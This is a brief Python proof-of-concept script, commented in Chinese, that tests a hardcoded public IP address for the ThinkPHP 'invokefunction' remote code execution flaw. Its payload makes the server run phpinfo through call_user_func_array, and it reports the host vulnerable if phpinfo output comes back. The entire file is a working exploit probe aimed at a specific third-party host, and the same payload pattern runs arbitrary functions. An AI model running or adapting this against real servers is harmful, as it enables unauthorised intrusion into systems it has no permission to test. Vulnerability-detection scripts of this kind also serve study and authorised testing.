# coding=utf-8
# Author: HSJ
# 2024/3/7 14:22
# 1. 准备一个检测的地址 url
# 2. 准备payloads
# 3. 发起请求： get/post
# 4. 分析响应结果
import requests

url = "http://23.110.48.10"

payloads = r"?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
}
# 发起请求
response = requests.get(url + payloads, headers=headers)
html = response.content.decode('utf-8')
# 在响应体里面去找一个或者多个标记
# PHP Version  |  Server API  | PHP Extension
if 'PHP Version' in html and 'Server API' in html and 'PHP Extension' in html:
    print("存在漏洞")
else:
    print("不存在漏洞")


